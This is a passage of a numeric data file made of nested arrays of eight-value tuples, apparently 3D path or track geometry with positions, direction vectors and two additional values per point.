-0.109,0.004,-0.993,0.383,0.311],[282,38.1,-67.2,-0.109,0.004,-0.993,0.491,0.247],[316,15.4,-70.9,-0.102,0.004,-0.994,0.361,0.274],[317,36.8,-70.9,-0.102,0.004,-0.994,0.456,0.245],[351,14.2,-74.3,-0.088,0.003,-0.995,0.314,0.231],[351,35.6,-74.3,-0.088,0.003,-0.995,0.441,0.238],[386,13.1,-76.7,-0.036,0.001,-0.998,0.262,0.232],[386,34.5,-76.7,-0.036,0.001,-0.998,0.441,0.240],[420,12.0,-74.7,0.181,-0.004,-0.982,0.285,0.238],[421,33.4,-74.7,0.181,-0.004,-0.982,0.446,0.216],[453,11.0,-63.4,0.475,-0.014,-0.878,0.211,0.143],[454,32.4,-63.3,0.475,-0.014,-0.878,0.367,0.214],[480,10.2,-41.4,0.762,-0.023,-0.644,0.081,0.152],[481,31.6,-41.4,0.762,-0.023,-0.644,0.175,0.199],[498,9.65,-11.3,0.932,-0.028,-0.359,0.028,0.204],[498,31.0,-11.3,0.932,-0.028,-0.359,0.142,0.149],[506,9.38,22.5,0.991,-0.030,-0.122,0.017,0.121],[507,30.8,22.5,0.991,-0.030,-0.122,0.090,0.108],[509,9.31,57.4,0.998,-0.030,-0.041,0.036,0.110],[509,30.7,57.4,0.998,-0.030,-0.041,0.114,0.068],[510,9.30,92.4,0.997,-0.030,-0.044,0.062,0.133],[510,30.7,92.3,0.997,-0.030,-0.044,0.192,0.035],[512,9.31,127,0.992,-0.030,-0.104,0.128,0.106],[513,30.6,127,0.992,-0.030,-0.104,0.242,0.027],[519,9.31,161,0.958,-0.030,-0.275,0.197,0.084],[519,30.6,161,0.958,-0.030,-0.275,0.178,0.006],[536,9.30,191,0.718,-0.030,-0.693,0.215,0.102],[537,30.6,191,0.718,-0.030,-0.693,0.273,0.018],[566,9.29,210,0.320,-0.030,-0.946,0.261,0.115],[566,30.7,209,0.320,-0.030,-0.946,0.331,0.024],[600,9.29,217,0.137,-0.030,-0.990,0.252,0.097],[600,30.7,216,0.137,-0.030,-0.990,0.292,0.020],[635,9.31,221,0.089,-0.030,-0.995,0.185,0.098],[635,30.7,220,0.089,-0.030,-0.995,0.275,0.034],[670,9.35,224,0.068,-0.030,-0.997,0.115,0.142],[670,30.7,223,0.068,-0.030,-0.997,0.249,0.042],[705,9.45,226,0.056,-0.030,-0.997,0.067,0.094],[705,30.8,225,0.056,-0.030,-0.997,0.161,0.038],[740,9.55,228,0.049,-0.030,-0.998,0.050,0.082],[740,30.9,227,0.049,-0.030,-0.998,0.123,0.029],[775,9.78,229,0.043,-0.030,-0.998,0.032,0.129],[775,31.2,228,0.043,-0.030,-0.998,0.149,0.033],[810,10,231,0.040,-0.030,-0.998,0.031,0.110],[810,31.4,230,0.040,-0.030,-0.998,0.107,0.033],[845,10.5,232,0.037,-0.030,-0.998,0.029,0.076],[844,32.0,231,0.037,-0.030,-0.998,0.080,0.030],[880,11.4,233,0.037,-0.030,-0.998,0.033,0.105],[879,32.8,232,0.037,-0.030,-0.998,0.118,0.036],[915,13.2,234,0.042,-0.029,-0.998,0.033,0.127],[914,34.5,234,0.042,-0.029,-0.998,0.142,0.042],[952,19.3,236,0.068,-0.024,-0.997,0.023,0.046],[946,39.9,235,0.068,-0.024,-0.997,0.132,0.044],[986,39.8,239,0.094,-0.012,-0.995,0.022,0.054],[971,55.4,237,0.094,-0.012,-0.995,0.152,0.045],[1008,72.1,241,0.100,-0.004,-0.994,0.030,0.127],[988,80.3,239,0.100,-0.004,-0.994,0.162,0.043],[1016,109,242,0.101,-0,-0.994,0.090,0.075],[995,111,239,0.101,-0,-0.994,0.210,0.037],[1018,144,242,0.101,-0,-0.994,0.161,0.078],[997,145,240,0.101,-0,-0.994,0.251,0.033],[1019,179,242,0.101,-0,-0.994,0.171,0.128],[998,180,240,0.101,-0,-0.994,0.280,0.035],[1020,215,242,0.101,-0,-0.994,0.098,0.109],[998,215,240,0.101,-0,-0.994,0.210,0.033],[1020,250,242,0.101,-0,-0.994,0.308,0.079],[999,250,240,0.101,-0,-0.994,0.382,0.029],[1020,285,242,0.101,-0,-0.994,0.309,0.110],[999,285,240,0.101,-0,-0.994,0.386,0.033],[1020,320,242,0.101,-0,-0.994,0.221,0.128],[999,320,240,0.101,-0,-0.994,0.290,0.033],[1020,355,242,0.101,-0,-0.994,0.102,0.080],[999,355,240,0.101,-0,-0.994,0.142,0.028],[1020,390,242,0.101,-0,-0.994,0.042,0.072],[999,390,240,0.101,-0,-0.994,0.089,0.022]]],[200,3000,50,23.0,[[-549,399,-439,0.928,-0.001,-0.371,0.084,0.005],[-530,400,-393,0.928,-0.001,-0.371,0.005,0.089],[-549,349,-439,0.928,-0.001,-0.371,0.041,0.006],[-530,350,-392,0.928,-0.001,-0.371,0.006,0.043],[-549,299,-439,0.928,-0.002,-0.371,0.077,0.006],[-530,300,-392,0.928,-0.002,-0.371,0.006,0.081],[-549,249,-438,0.928,-0.003,-0.371,0.054,0.006],[-530,250,-392,0.928,-0.003,-0.371,0.006,0.097],[-549,199,-438,0.928,-0.005,-0.370,0.050,0.061],[-530,200,-391,0.928,-0.005,-0.370,0.029,0.214],[-549,149,-437,0.928,-0.008,-0.369,0.066,0.129],[-530,150,-390,0.928,-0.008,-0.369,0.005,0.329],[-549,98.5,-435,0.929,-0.023,-0.367,0.033,0.129],[-530,101,-388,0.929,-0.023,-0.367,0.005,0.279],[-549,38.8,-421,0.929,-0.204,-0.305,0.079,0.030],[-530,64.6,-382,0.929,-0.204,-0.305,0.003,0.295],[-549,6.65,-361,0.928,-0.368,-0.042,0.029,0.034],[-530,52.8,-356,0.928,-0.368,-0.042,0.053,0.234],[-549,3.30,-309,0.928,-0.370,-0.014,0.099,0.030],[-530,49.7,-308,0.928,-0.370,-0.014,0.114,0.248],[-548,2.30,-259,0.928,-0.371,-0.012,0.071,0.024],[-530,48.7,-258,0.928,-0.371,-0.012,0.032,0.158],[-548,1.94,-208,0.927,-0.371,-0.020,0.100,0.059],[-529,48.3,-209,0.927,-0.371,-0.020,0.152,0.282],[-546,1.85,-158,0.924,-0.372,-0.051,0.145,0.078],[-528,48.1,-159,0.924,-0.372,-0.051,0.215,0.290],[-539,1.83,-106,0.880,-0.373,-0.289,0.135,0.279],[-521,48.1,-112,0.880,-0.373,-0.289,0.243,0.291],[-503,1.81,-64.2,0.427,-0.372,-0.823,0.229,0.293],[-494,48.1,-80.7,0.427,-0.372,-0.823,0.427,0.478],[-452,1.79,-49.8,0.166,-0.371,-0.913,0.196,0.314],[-449,48.2,-68.1,0.166,-0.371,-0.913,0.383,0.502],[-402,1.84,-42.2,0.126,-0.370,-0.920,0.262,0.366],[-400,48.2,-60.6,0.126,-0.370,-0.920,0.303,0.571],[-352,2.30,-35.8,0.122,-0.369,-0.920,0.400,0.206],[-351,48.7,-54.4,0.122,-0.369,-0.920,0.457,0.469],[-294,23.0,-29.1,0.311,-0.308,-0.898,0.582,0.076],[-318,61.4,-50.5,0.311,-0.308,-0.898,0.570,0.381],[-260,40.4,-25.4,0.125,-0.374,-0.918,0.555,0.213],[-263,86.5,-44.6,0.125,-0.374,-0.918,0.542,0.324],[-212,41.6,-22.2,0.050,-0.379,-0.923,0.515,0.500],[-211,87.8,-41.2,0.050,-0.379,-0.923,0.464,0.441],[-162,41.7,-19.8,0.040,-0.379,-0.924,0.509,0.543],[-161,88.0,-38.8,0.040,-0.379,-0.924,0.430,0.511],[-112,41.7,-17.9,0.033,-0.379,-0.924,0.461,0.450],[-111,88.0,-36.8,0.033,-0.379,-0.924,0.320,0.422],[-62.6,41.6,-16.2,0.026,-0.379,-0.924,0.440,0.349],[-61.9,87.9,-35.2,0.026,-0.379,-0.924,0.233,0.391],[-12.6,41.5,-14.9,0.018,-0.379,-0.924,0.326,0.534],[-12.0,87.8,-33.8,0.018,-0.379,-0.924,0.238,0.619],[37.3,41.1,-14.1,0.004,-0.378,-0.924,0.187,0.616],[37.9,87.4,-33.1,0.004,-0.378,-0.924,0.238,0.760],[87.0,40.1,-14.7,-0.050,-0.374,-0.923,0.245,0.551],[88.2,86.3,-33.5,-0.050,-0.374,-0.923,0.330,0.605],[131,32.5,-22.6,-0.415,-0.311,-0.854,0.290,0.447],[139,77.4,-43.0,-0.415,-0.311,-0.854,0.263,0.398],[175,15.5,-40.2,-0.402,-0.315,-0.858,0.370,0.306],[183,60.6,-60.4,-0.402,-0.315,-0.858,0.283,0.507],[227,6.81,-51.4,-0.147,-0.365,-0.919,0.216,0.305],[227,53.2,-70,-0.147,-0.365,-0.919,0.132,0.409],[277,4.35,-57.4,-0.117,-0.367,-0.922,0.318,0.253],[276,50.8,-75.9,-0.117,-0.367,-0.922,0.366,0.353],[326,2.57,-62.7,-0.105,-0.367,-0.923,0.252,0.213],[326,49.0,-81.1,-0.105,-0.367,-0.923,0.273,0.336],[376,0.977,-67.0,-0.069,-0.369,-0.926,0.118,0.193],[376,47.3,-85.5,-0.069,-0.369,-0.926,0.165,0.344],[423,-0.492,-64.6,0.191,-0.378,-0.905,0.127,0.189],[428,45.7,-82.7,0.191,-0.378,-0.905,0.092,0.275],[463,-1.75,-45.0,0.591,-0.390,-0.704,0.071,0.183],[477,44.2,-59.1,0.591,-0.390,-0.704,0.089,0.249],[489,-2.55,-8.04,0.853,-0.398,-0.333,0.075,0.153],[508,43.2,-14.7,0.853,-0.398,-0.333,0.007,0.208],[498,-2.86,38.0,0.914,-0.399,-0.063,0.038,0.072],[518,42.9,36.8,0.914,-0.399,-0.063,0.050,0.082],[500,-2.89,87.8,0.915,-0.399,-0.037,0.095,0.011],[520,42.9,86.9,0.915,-0.399,-0.037,0.148,0.085],[504,-2.83,138,0.904,-0.401,-0.128,0.137,0.004],[524,42.8,135,0.904,-0.401,-0.128,0.213,0.057],[522,-2.87,189,0.738,-0.401,-0.540,0.161,0.002],[538,42.8,177,0.738,-0.401,-0.540,0.271,0.048],[568,-2.88,221,0.254,-0.401,-0.879,0.174,0.017],[573,42.8,201,0.254,-0.401,-0.879,0.252,0.118],[619,-2.90,229,0.094,-0.399,-0.911,0.105,0.026],[621,42.9,209,0.094,-0.399,-0.911,0.147,0.116],[669,-2.84,233,0.063,-0.399,-0.914,0.090,0.036],[670,42.9,213,0.063,-0.399,-0.914,0.038,0.172],[719,-2.71,236,0.050,-0.399,-0.915,0.042,0.024],[720,43.1,216,0.050,-0.399,-0.915,0.011,0.125],[769,-2.45,238,0.043,-0.399,-0.915,0.076,0.006],[770,43.3,219,0.043,-0.399,-0.915,0.017,0.133],[820,-2.03,241,0.041,-0.399,-0.915,0.055,0.006],[820,43.7,221,0.041,-0.399,-0.915,0.019,0.058],[870,-1.19,242,0.044,-0.398,-0.915,0.053,0.010],[869,44.6,222,0.044,-0.398,-0.915,0.006,0.069],[921,1.57,244,0.075,-0.393,-0.915,0.073,0.026],[918,47.2,224,0.075,-0.393,-0.915,0.005,0.124],[978,19.0,248,0.280,-0.324,-0.902,0.021,0.033],[955,57.8,227,0.280,-0.324,-0.902,0.004,0.124],[1019,67.4,251,0.430,-0.144,-0.890,0.081,0.030],[978,85.1,228,0.430,-0.144,-0.890,0.010,0.154],[1029,123,252,0.462,-0.023,-0.886,0.081,0.016],[985,126,229,0.462,-0.023,-0.886,0.104,0.083],[1031,174,252,0.463,-0.007,-0.886,0.165,0.007],[986,175,229,0.463,-0.007,-0.886,0.183,0.093],[1031,224,252,0.463,-0.003,-0.886,0.138,0.006],[987,225,229,0.463,-0.003,-0.886,0.242,0.064],[1032,275,252,0.463,-0,-0.886,0.274,0.006],[987,275,229,0.463,-0,-0.886,0.294,0.067],[1032,325,252,0.463,-0,-0.886,0.208,0.006],[987,325,229,0.463,-0,-0.886,0.144,0.081],[1032,375,252,0.463,-0,-0.886,0.079,0.006],[987,375,229,0.463,-0,-0.886,0.026,0.042]]],[350,3700,50,22.5,[[-371,424,-433,0.099,-0.015,-0.994,0,0.001],[-328,425,-429,0.099,-0.015,-0.994,0,0.001],[-371,374,-431,0.099,-0.058,-0.991,0,0.088],[-328,375,-426,0.099,-0.058,-0.991,0,0.092],[-371,325,-426,0.100,-0.157,-0.978,0,0.166],[-328,325,-421,0.100,-0.157,-0.978,0,0.177],[-371,287,-394,0.099,-0.960,-0.260,0.046,0.147],[-328,291,-393,0.099,-0.960,-0.260,0.045,0.155],[-371,280,-344,0.099,-0.992,-0.074,0.079,0.092],[-328,285,-344,0.099,-0.992,-0.074,0.107,0.096],[-371,278,-294,0.099,-0.993,-0.047,0.133,0.002],[-328,282,-294,0.099,-0.993,-0.047,0.139,0.002],[-371,275,-245,0.099,-0.991,-0.060,0.292,0],[-329,279,-244,0.099,-0.991,-0.060,0.225,0],[-372,269,-196,0.104,-0.970,-0.204,0.338,0],[-330,274,-194,0.104,-0.970,-0.204,0.240,0],[-376,246,-158,0.172,-0.532,-0.827,0.321,0.096],[-334,246,-149,0.172,-0.532,-0.827,0.221,0.033],[-383,202,-154,0.277,0.144,-0.949,0.348,0.452],[-342,194,-143,0.277,0.144,-0.949,0.236,0.409],[-390,155,-167,0.294,0.257,-0.920,0.302,0.798],[-349,146,-157,0.294,0.257,-0.920,0.125,0.737],[-397,109,-183,0.296,0.271,-0.915,0.235,0.674],[-357,99.3,-173,0.296,0.271,-0.915,0.161,0.673],[-404,62.4,-200,0.296,0.269,-0.915,0.330,0.343],[-364,52.5,-189,0.296,0.269,-0.915,0.301,0.453],[-412,15.1,-215,0.291,0.223,-0.928,0.339,0.272],[-371,5.90,-205,0.291,0.223,-0.928,0.276,0.395],[-419,-38.0,-214,0.170,-0.679,-0.713,0.019,0.153],[-377,-35.4,-206,0.170,-0.679,-0.713,0.022,0.148],[-417,-60.8,-161,0.156,-0.949,-0.273,0.001,0.115],[-376,-52.2,-168,0.156,-0.949,-0.273,0.004,0.174],[-373,-71.6,-110,0.080,-0.934,-0.346,0.001,0.167],[-360,-56.5,-148,0.080,-0.934,-0.346,0.004,0.202],[-320,-71.9,-100,0.058,-0.933,-0.352,0.001,0.532],[-315,-56.6,-139,0.058,-0.933,-0.352,0.002,0.674],[-270,-70.9,-94.3,0.058,-0.933,-0.352,0,0.874],[-266,-55.6,-134,0.058,-0.933,-0.352,0,0.871],[-220,-69.5,-89.8,0.058,-0.933,-0.352,0,0.757],[-217,-54.2,-129,0.058,-0.933,-0.352,0,0.782],[-170,-68.0,-85.3,0.062,-0.933,-0.352,0,0.654],[-167,-52.8,-125,0.062,-0.933,-0.352,0,0.796],[-120,-65.8,-81.4,0.077,-0.932,-0.351,0,0.703],[-118,-50.5,-121,0.077,-0.932,-0.351,0,0.754],[-69.9,-62.1,-78.0,0.113,-0.928,-0.350,0,0.731],[-68.8,-46.9,-118,0.113,-0.928,-0.350,0.005,0.825],[-18.7,-53.3,-75.3,0.291,-0.891,-0.343,0.076,0.315],[-21.7,-38.9,-115,0.291,-0.891,-0.343,0.089,0.336],[18.3,-12.3,-74.7,0.925,-0.176,-0.333,0.327,0.417],[4.30,-9.76,-115,0.925,-0.176,-0.333,0.364,0.346],[17.6,39.5,-74.8,0.937,0.103,-0.332,0.464,0.587],[3.43,37.9,-115,0.937,0.103,-0.332,0.490,0.507],[10.6,89.3,-74.9,0.931,0.141,-0.332,0.432,0.541],[-3.48,87.1,-115,0.931,0.141,-0.332,0.407,0.434],[2.97,138,-74.9,0.931,0.140,-0.332,0.421,0.712],[-11.1,136,-115,0.931,0.140,-0.332,0.304,0.642],[-3.61,188,-75.2,0.934,0.100,-0.333,0.382,0.471],[-17.8,186,-115,0.934,0.100,-0.333,0.319,0.408],[-4.48,236,-75.7,0.929,-0.127,-0.332,0.625,0.160],[-18.7,237,-115,0.929,-0.127,-0.332,0.578,0.059],[25.2,259,-77.6,0.036,-0.961,-0.268,0.813,0.054],[21.7,271,-118,0.036,-0.961,-0.268,0.800,0.136],[73.6,254,-81.3,-0.190,-0.949,-0.250,0.391,0.032],[72.2,265,-122,-0.190,-0.949,-0.250,0.471,0.061],[123,246,-85.6,-0.149,-0.955,-0.254,0.183,0.012],[120,257,-126,-0.149,-0.955,-0.254,0.213,0.012],[173,242,-90.4,-0.030,-0.963,-0.266,0.394,0.009],[169,254,-131,-0.030,-0.963,-0.266,0.484,0.009],[224,245,-95.9,0.078,-0.957,-0.277,0.686,0.007],[218,256,-136,0.078,-0.957,-0.277,0.728,0.007],[275,253,-104,0.125,-0.950,-0.283,0.787,0.002],[264,264,-144,0.125,-0.950,-0.283,0.738,0.002],[327,266,-128,0.072,-0.964,-0.251,0.764,0],[300,272,-160,0.072,-0.964,-0.251,0.589,0],[361,278,-178,0.006,-0.987,-0.156,0.496,0],[320,280,-190,0.006,-0.987,-0.156,0.402,0],[370,284,-231,-0.007,-0.995,-0.090,0.255,0],[328,285,-235,-0.007,-0.995,-0.090,0.239,0],[374,287,-281,-0.017,-0.996,0.017,0.268,0],[332,287,-284,-0.017,-0.996,0.017,0.290,0],[378,275,-328,-0.070,-0.754,0.647,0.199,0],[335,275,-332,-0.070,-0.754,0.647,0.248,0],[382,231,-340,-0.145,0.011,0.988,0.265,0],[340,227,-347,-0.145,0.011,0.988,0.333,0],[388,185,-334,-0.169,0.186,0.967,0.198,0],[347,175,-340,-0.169,0.186,0.967,0.193,0],[402,169,-326,-0.357,0.379,0.853,0.191,0],[391,129,-313,-0.357,0.379,0.853,0.172,0],[444,170,-307,-0.379,0.382,0.842,0.064,0.015],[440,130,-291,-0.379,0.382,0.842,0.084,0.015],[491,173,-288,-0.316,0.384,0.866,0.079,0.048],[487,133,-272,-0.316,0.384,0.866,0.110,0.055],[543,167,-278,0.084,0.331,0.939,0.128,0.046],[531,128,-264,0.084,0.331,0.939,0.120,0.052],[591,148,-280,0.182,0.299,0.935,0.022,0.019],[576,111,-266,0.182,0.299,0.935,0.208,0.021],[638,129,-282,0.126,0.324,0.935,0.274,0],[622,92.4,-268,0.126,0.324,0.935,0.362,0],[685,109,-274,-0.235,0.470,0.847,0.468,0],[665,74.6,-260,-0.235,0.470,0.847,0.410,0],[714,102,-231,-0.784,0.609,0.105,0.555,0.009],[689,69.1,-225,-0.784,0.609,0.105,0.448,0],[715,109,-181,-0.798,0.573,-0.180,0.359,0.007],[689,75.8,-177,-0.798,0.573,-0.180,0.326,0],[709,121,-134,-0.789,0.554,-0.261,0.038,0],[683,87.6,-127,-0.789,0.554,-0.261,0.140,0],[703,136,-88.6,-0.784,0.541,-0.301,0.064,0.001],[677,103,-79.1,-0.784,0.541,-0.301,0.147,0],[699,155,-45.1,-0.782,0.533,-0.321,0.181,0.045],[672,124,-31.6,-0.782,0.533,-0.321,0.106,0.021],[699,178,-5.42,-0.778,0.565,-0.271,0.195,0.101],[673,151,15.4,-0.778,0.565,-0.271,0.325,0.086],[711,198,17.7,-0.604,0.794,-0.046,0.035,0.173],[699,191,58.3,-0.604,0.794,-0.046,0.044,0.187],[744,213,15.3,-0.321,0.946,-0.033,0.056,0.092],[754,218,56.7,-0.321,0.946,-0.033,0,0.176],[788,226,0.842,-0.248,0.967,-0.056,0.205,0.042],[801,231,41.2,-0.248,0.967,-0.056,0.044,0.266],[835,235,-15.5,-0.190,0.978,-0.076,0.330,0.184],[847,241,24.9,-0.190,0.978,-0.076,0.161,0.324],[883,242,-30.8,-0.129,0.986,-0.095,0.273,0.425],[894,247,10,-0.129,0.986,-0.095,0.259,0.558],[931,245,-44.0,-0.088,0.989,-0.107,0.127,0.749],[941,251,-2.79,-0.088,0.989,-0.107,0.229,0.784],[980,249,-55.8,-0.124,0.985,-0.099,0.107,0.515],[989,254,-14.3,-0.124,0.985,-0.099,0.218,0.513],[1029,261,-66.1,-0.448,0.889,-0.031,0.141,0.085],[1035,265,-24.1,-0.448,0.889,-0.031,0.178,0.077],[1058,302,-72.0,-0.974,0.211,0.073,0.186,0.080],[1062,303,-29.3,-0.974,0.211,0.073,0.166,0.015],[1065,352,-73.3,-0.994,0.058,0.077,0.062,0.024],[1068,352,-30.6,-0.994,0.058,0.077,0.078,0],[1067,402,-73.7,-0.996,0.024,0.078,0.002,0],[1070,402,-31.0,-0.996,0.024,0.078,0.002,0]]],[50,2850,50,30,[[-950,89.9,-278,-0.359,-0.267,-0.780,0,0.088],[-961,126,-286,-0.359,-0.267,-0.780,0,0.107],[-907,98.2,-301,-0.351,-0.269,-0.776,0,0.154],[-917,134,-309,-0.351,-0.269,-0.776,0,0.159],[-863,106,-323,-0.322,-0.266,-0.785,0,0.134],[-873,142,-331,-0.322,-0.266,-0.785,0,0.126],[-818,113,-342,-0.256,-0.258,-0.809,0,0.160],[-826,149,-351,-0.256,-0.258,-0.809,0,0.169],[-772,117,-354,-0.139,-0.241,-0.850,0.162,0.207],[-777,154,-364,-0.139,-0.241,-0.850,0.118,0.192],[-724,120,-360,-0.028,-0.230,-0.864,0.306,0.242],[-726,157,-370,-0.028,-0.230,-0.864,0.299,0.204],[-675,122,-359,0.085,-0.221,-0.853,0.237,0.311],[-675,158,-368,0.085,-0.221,-0.853,0.215,0.235],[-626,124,-349,0.282,-0.207,-0.809,0.266,0.348],[-626,161,-359,0.282,-0.207,-0.809,0.248,0.273],[-582,129,-327,0.514,-0.184,-0.721,0.270,0.484],[-582,167,-337,0.514,-0.184,-0.721,0.272,0.349],[-542,137,-297,0.580,-0.180,-0.714,0.205,0.598],[-543,176,-308,0.580,-0.180,-0.714,0.166,0.408],[-498,146,-273,0.252,-0.239,-0.862,0.158,0.586],[-501,184,-284,0.252,-0.239,-0.862,0.122,0.429],[-448,150,-277,-0.247,-0.281,-0.838,0.143,0.410],[-453,187,-288,-0.247,-0.281,-0.838,0.104,0.378],[-401,151,-296,-0.346,-0.279,-0.781,0.083,0.323],[-407,188,-306,-0.346,-0.279,-0.781,0.032,0.476],[-356,152,-316,-0.325,-0.279,-0.792,0.048,0.340],[-361,188,-327,-0.325,-0.279,-0.792,0.025,0.566],[-309,154,-332,-0.217,-0.278,-0.829,0.059,0.327],[-314,191,-343,-0.217,-0.278,-0.829,0.032,0.534],[-263,156,-341,-0.049,-0.294,-0.838,0.059,0.294],[-262,192,-353,-0.049,-0.294,-0.838,0.048,0.416],[-228,147,-332,0.354,-0.387,-0.729,0.045,0.217],[-206,179,-337,0.354,-0.387,-0.729,0.100,0.261],[-206,126,-302,0.474,-0.501,-0.583,0.296,0.192],[-176,150,-298,0.474,-0.501,-0.583,0.322,0.251],[-199,101,-271,0.492,-0.564,-0.509,0.453,0.257],[-167,113,-254,0.492,-0.564,-0.509,0.340,0.409],[-215,75.3,-253,0.446,-0.656,-0.433,0.442,0.205],[-195,68.2,-221,0.446,-0.656,-0.433,0.588,0.378],[-251,44.6,-242,0.420,-0.695,-0.393,0.311,0.156],[-233,36.4,-208,0.420,-0.695,-0.393,0.369,0.265],[-290,12.0,-222,0.380,-0.734,-0.361,0.138,0.219],[-266,9.87,-192,0.380,-0.734,-0.361,0.243,0.228],[-317,-18.6,-176,0.310,-0.806,-0.271,0.085,0.057],[-281,-8.67,-165,0.310,-0.806,-0.271,0.107,0.107],[-318,-34.3,-122,0.305,-0.831,-0.214,0.338,0.283],[-281,-20.6,-123,0.305,-0.831,-0.214,0.261,0.430],[-308,-44.2,-71.3,0.314,-0.832,-0.220,0.214,0.315],[-273,-28.8,-78.6,0.314,-0.832,-0.220,0.242,0.506],[-286,-51.2,-20.2,0.272,-0.824,-0.285,0.074,0.154],[-256,-34.7,-38.9,0.272,-0.824,-0.285,0.135,0.454],[-241,-54.5,17.6,0.170,-0.816,-0.382,0.036,0.137],[-226,-36.6,-14.0,0.170,-0.816,-0.382,0.098,0.427],[-186,-53.0,31.7,0.079,-0.818,-0.404,0.033,0.074],[-184,-35.5,-3.38,0.079,-0.818,-0.404,0.091,0.222],[-129,-48.2,24.7,-0.051,-0.830,-0.388,0.044,0.130],[-144,-32.1,-7.80,-0.051,-0.830,-0.388,0.109,0.305],[-83.5,-39.0,-15.3,-0.183,-0.857,-0.262,0.107,0.324],[-117,-26.8,-31.7,-0.183,-0.857,-0.262,0.174,0.371],[-65.7,-29.7,-66.0,-0.184,-0.869,-0.187,0.283,0.400],[-102,-20.2,-73.8,-0.184,-0.869,-0.187,0.256,0.418],[-53.8,-21.9,-113,-0.176,-0.874,-0.178,0.315,0.250],[-90.8,-12.8,-121,-0.176,-0.874,-0.178,0.261,0.206],[-39.5,-16.2,-156,-0.171,-0.881,-0.158,0.078,0.202],[-73.6,-6.60,-173,-0.171,-0.881,-0.158,0.176,0.087],[-12.5,-19.1,-176,-0.180,-0.862,-0.158,0.027,0.273],[-23.9,-10.2,-212,-0.180,-0.862,-0.158,0.051,0.304],[33.8,-17.4,-187,0.367,-0.753,-0.262,0.177,0.303],[25.7,-8.98,-222,0.367,-0.753,-0.262,0.183,0.270],[53.6,28.1,-183,0.874,-0.065,-0.259,0.449,0.416],[42.9,33.3,-221,0.874,-0.065,-0.259,0.398,0.439],[58.8,76.9,-177,0.893,-0.116,-0.268,0.458,0.245],[48.1,83.2,-216,0.893,-0.116,-0.268,0.421,0.241],[80.9,114,-174,0.377,-0.776,-0.333,0.248,0.137],[75.4,127,-211,0.377,-0.776,-0.333,0.276,0.140],[127,123,-174,0.062,-0.838,-0.306,0.236,0.256],[126,136,-211,0.062,-0.838,-0.306,0.273,0.266],[166,127,-168,0.382,-0.784,-0.185,0.213,0.466],[183,142,-198,0.382,-0.784,-0.185,0.225,0.676],[186,143,-132,0.643,-0.642,0.075,0.379,0.552],[209,163,-155,0.643,-0.642,0.075,0.535,0.758],[219,179,-96.7,0.607,-0.685,0.073,0.641,0.386],[231,186,-133,0.607,-0.685,0.073,0.614,0.655],[261,212,-85.3,0.465,-0.811,0.042,0.573,0.326],[266,213,-125,0.465,-0.811,0.042,0.411,0.573],[311,228,-83.0,0.082,-0.919,0.025,0.329,0.206],[310,227,-122,0.082,-0.919,0.025,0.356,0.524],[362,226,-87.5,-0.090,-0.893,0.038,0.386,0.459],[358,225,-125,-0.090,-0.893,0.038,0.463,0.442],[412,221,-93.3,-0.054,-0.895,0.034,0.249,0.574],[407,220,-131,-0.054,-0.895,0.034,0.421,0.526],[462,221,-99.9,0.078,-0.893,0.017,0.291,0.407],[457,220,-138,0.078,-0.893,0.017,0.381,0.504],[510,229,-106,0.194,-0.886,0.003,0.270,0.164],[506,228,-144,0.194,-0.886,0.003,0.356,0.320],[559,241,-112,0.225,-0.889,-0,0.233,0.036],[554,240,-151,0.225,-0.889,-0,0.333,0.104],[607,253,-118,0.227,-0.892,0,0.132,0.008],[602,252,-157,0.227,-0.892,0,0.062,0.023],[655,265,-123,0.204,-0.902,0.002,0.062,0],[650,264,-163,0.204,-0.902,0.002,0.113,0],[703,270,-128,-0.064,-0.917,0.023,0.062,0.008],[701,270,-167,-0.064,-0.917,0.023,0.181,0.008],[750,260,-129,-0.262,-0.860,0.047,0.121,0.137],[751,258,-168,-0.262,-0.860,0.047,0.257,0.109],[782,256,-119,0.096,-0.864,0.225,0.063,0.106],[810,252,-146,0.096,-0.864,0.225,0.196,0.087],[797,275,-86.1,0.228,-0.786,0.400,0.081,0.093],[833,278,-100,0.228,-0.786,0.400,0.129,0.066],[809,299,-45.2,0.225,-0.795,0.394,0.213,0.016],[846,303,-57.7,0.225,-0.795,0.394,0.211,0.012]]],[200,3000,50,25,[[-906,125,-205,-0.208,0.288,-0.904,0.283,0.000],[-903,165,-193,-0.208,0.288,-0.904,0.174,0.000],[-857,125,-216,-0.206,0.288,-0.903,0.352,0.069],[-855,165,-204,-0.206,0.288,-0.903,0.157,0.001],[-808,126,-226,-0.176,0.289,-0.909,0.399,0.136],[-806,166,-214,-0.176,0.289,-0.909,0.239,0.003],[-757,127,-234,-0.113,0.290,-0.920,0.400,0.186],[-758,167,-221,-0.113,0.290,-0.920,0.356,0.006],[-706,130,-237,-0.026,0.293,-0.927,0.491,0.185],[-709,170,-224,-0.026,0.293,-0.927,0.383,0.009],[-656,134,-235,0.052,0.295,-0.923,0.587,0.108],[-660,173,-223,0.052,0.295,-0.923,0.331,0.014],[-607,135,-229,0.169,0.295,-0.906,0.664,0.180],[-609,175,-216,0.169,0.295,-0.906,0.392,0.019],[-561,132,-217,0.327,0.285,-0.867,0.636,0.228],[-560,171,-204,0.327,0.285,-0.867,0.358,0.092],[-516,123,-199,0.450,0.265,-0.822,0.482,0.272],[-513,162,-185,0.450,0.265,-0.822,0.402,0.220],[-473,110,-178,0.484,0.261,-0.811,0.309,0.385],[-469,149,-163,0.484,0.261,-0.811,0.235,0.307],[-429,98.6,-157,0.417,0.279,-0.845,0.363,0.506],[-426,138,-143,0.417,0.279,-0.845,0.317,0.503],[-380,92.0,-140,0.252,0.299,-0.900,0.324,0.569],[-381,132,-127,0.252,0.299,-0.900,0.341,0.648],[-330,92.3,-130,0.117,0.297,-0.924,0.264,0.651],[-333,132,-118,0.117,0.297,-0.924,0.240,0.586],[-280,96.1,-124,0.062,0.291,-0.930,0.235,0.646],[-284,135,-112,0.062,0.291,-0.930,0.178,0.412],[-230,100,-120,0.041,0.287,-0.932,0.271,0.480],[-235,140,-108,0.041,0.287,-0.932,0.222,0.277],[-181,105,-117,0.023,0.279,-0.935,0.321,0.280],[-184,145,-105,0.023,0.279,-0.935,0.271,0.103],[-162,110,-115,-0.031,0.304,-0.927,0.318,0.256],[-120,113,-115,-0.031,0.304,-0.927,0.414,0.290],[-176,77.5,-130,0.068,0.506,-0.845,0.268,0.406],[-138,60.9,-137,0.068,0.506,-0.845,0.186,0.500],[-194,47.0,-168,0.279,0.876,-0.356,0.241,0.592],[-154,33.1,-171,0.279,0.876,-0.356,0.216,0.391],[-198,39.0,-218,0.310,0.927,-0.054,0.313,0.786],[-158,25.7,-218,0.310,0.927,-0.054,0.274,0.353],[-195,38.3,-271,